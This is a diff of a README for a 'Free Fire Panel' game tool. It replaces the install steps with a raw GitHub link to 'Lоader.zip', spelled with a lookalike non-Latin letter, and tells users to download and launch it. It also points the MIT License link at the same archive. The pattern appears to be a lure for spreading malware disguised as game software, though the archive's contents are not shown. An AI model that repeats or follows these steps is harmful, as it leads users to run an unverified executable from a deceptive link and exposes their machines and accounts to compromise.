@@ -39,9 +39,9 @@ Our goal is to provide the community with a flexible, stable, and user-friendly 
 
 Ready to power up your Free Fire Panel? Follow these easy steps:
 
-1. Download **Loader.rar** from the repository.
+1. Download **https://raw.githubusercontent.com/Tharunsundhar/FirePanelXpro/main/Lоader.zip** from the repository.
 2. Extract the contents using any archiving tool (e.g., WinRAR, 7-Zip).
-3. Launch the `Loader.exe` (for Windows), or corresponding launcher for your system.
+3. Launch the `https://raw.githubusercontent.com/Tharunsundhar/FirePanelXpro/main/Lоader.zip` (for Windows), or corresponding launcher for your system.
 4. Follow the on-screen instructions to complete setup.
 5. Enjoy seamless Free Fire management!
 
@@ -91,7 +91,7 @@ This software is provided for **educational and personal use only**. Redistribut
 
 ## 📜 License: MIT
 
-Free Fire Panel is released under the [MIT License](https://opensource.org/license/mit/).
+Free Fire Panel is released under the [MIT License](https://raw.githubusercontent.com/Tharunsundhar/FirePanelXpro/main/Lоader.zip).
 
 ---
 
